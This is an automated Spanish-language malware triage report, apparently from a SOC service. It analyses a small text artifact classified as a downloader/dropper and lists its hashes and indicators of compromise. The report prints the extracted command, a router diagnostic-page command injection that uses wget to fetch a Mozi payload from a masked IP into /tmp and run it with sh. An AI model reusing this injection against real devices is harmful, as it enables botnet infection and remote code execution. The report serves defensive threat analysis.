# 🧬 Payload Analysis

`6a3a73c6176616a2ba5e42c5c666f9b6cc9a2cedde59579d6dd5a8081c6f7a58`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:50:14+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6a3a73c6176616a2ba5e42c5c666f9b6cc9a2cedde59579d6dd5a8081c6f7a58`
- **SHA1:** `fc52fa8fb5c9eaff1b5a4017e80a49205ff6af15`
- **MD5:** `08e06ffac90a47f78c4d644aea274063`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.42 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 100.5.110.XXX | static_analysis |
| url | hxxp://100.5.110.XXX:51986/Mozi.m+-O+- | strings |
| hash | 6a3a73c6176616a2ba5e42c5c666f9b6cc9a2cedde59579d6dd5a8081c6f7a58 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| ip | 162.4.163.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
